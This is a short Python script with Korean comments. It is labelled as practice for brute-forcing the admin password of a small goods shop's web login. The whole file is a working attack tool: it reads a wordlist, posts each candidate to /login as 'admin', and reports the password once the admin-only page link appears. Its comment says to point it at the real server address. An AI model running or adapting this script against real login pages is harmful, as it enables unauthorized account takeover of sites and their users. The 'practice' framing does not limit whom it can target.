#!/usr/bin/env python3
"""
튼튼이 굿즈샵 - admin 계정 무차별 대입 연습 스크립트

사용법:
    pip install requests
    python bruteforce_admin.py

BASE_URL을 본인 서버 주소로 바꿔서 실행하세요.
같은 폴더의 admin_wordlist.txt에 있는 후보들을 하나씩 /login에 시도합니다.
"""

import sys
import requests

BASE_URL = "http://127.0.0.1:5000"  # 실제 서버 주소로 바꾸세요 (예: http://teunteuni.shop)
WORDLIST_PATH = "admin_wordlist.txt"
USERNAME = "admin"


def try_login(session: requests.Session, password: str) -> bool:
    resp = session.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME, "password": password},
        allow_redirects=True,
        timeout=5,
    )
    # 로그인에 성공하면 홈 화면 nav에 "관리자 페이지" 링크가 뜬다 (admin 전용)
    return "관리자 페이지" in resp.text


def main():
    try:
        with open(WORDLIST_PATH, encoding="utf-8") as f:
            candidates = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"'{WORDLIST_PATH}'를 찾을 수 없습니다. 같은 폴더에 두세요.")
        sys.exit(1)

    print(f"{len(candidates)}개 후보로 {BASE_URL}/login 을 시도합니다...")

    for i, pw in enumerate(candidates, 1):
        session = requests.Session()
        try:
            if try_login(session, pw):
                print(f"\n[+] 성공! ({i}/{len(candidates)}번째 시도)")
                print(f"[+] admin 비밀번호: {pw}")
                return
        except requests.RequestException as e:
            print(f"[!] 요청 실패 ({pw}): {e}")
            continue

        if i % 20 == 0:
            print(f"  ... {i}/{len(candidates)} 시도, 아직 못 찾음")

    print("\n[-] 워드리스트 안에 정답이 없습니다. 후보를 더 추가해보세요.")


if __name__ == "__main__":
    main()
